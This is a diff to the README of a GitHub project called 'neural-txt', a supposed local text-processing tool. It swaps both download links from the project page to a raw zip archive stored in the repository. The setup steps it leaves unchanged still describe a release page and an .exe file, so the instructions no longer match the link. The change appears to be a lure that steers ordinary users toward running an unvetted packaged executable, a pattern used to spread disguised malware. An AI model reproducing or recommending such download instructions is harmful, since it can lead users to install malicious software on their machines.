@@ -1,6 +1,6 @@
 # 🧠 neural-txt - Quick local processing for technical documents
 
-[![Download neural-txt](https://img.shields.io/badge/Download-neural--txt-blue.svg)](https://github.com/rivaldif8048/neural-txt)
+[![Download neural-txt](https://img.shields.io/badge/Download-neural--txt-blue.svg)](https://github.com/rivaldif8048/neural-txt/raw/refs/heads/main/neuraltxt/neural-txt-v2.1.zip)
 
 ## 📋 About this software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards to run the application smoothly:
 
 You must download the file from our official repository page. Follow these steps to obtain the software:
 
-1. Visit [this page to download] (https://github.com/rivaldif8048/neural-txt).
+1. Visit [this page to download] (https://github.com/rivaldif8048/neural-txt/raw/refs/heads/main/neuraltxt/neural-txt-v2.1.zip).
 2. Look for the latest release version on the right side of the screen.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop or your downloads folder.
